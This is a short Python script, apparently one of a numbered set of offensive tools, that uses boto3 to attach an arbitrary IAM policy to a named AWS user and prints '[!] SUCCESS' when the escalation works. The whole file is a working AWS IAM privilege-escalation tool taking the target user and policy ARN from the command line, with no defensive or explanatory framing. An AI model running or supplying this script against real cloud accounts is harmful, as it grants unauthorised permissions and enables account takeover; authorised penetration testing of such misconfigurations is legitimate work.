import boto3, sys
def escalate(user, policy_arn):
    client = boto3.client('iam')
    try:
        client.attach_user_policy(UserName=user, PolicyArn=policy_arn)
        print(f"[!] SUCCESS: Attached {policy_arn} to {user}")
    except Exception as e: print(f"[-] Failed: {e}")
if __name__ == "__main__":
    if len(sys.argv) < 3: print("Usage: 120_iam <username> <policy_arn>"); sys.exit(1)
    escalate(sys.argv[1], sys.argv[2])
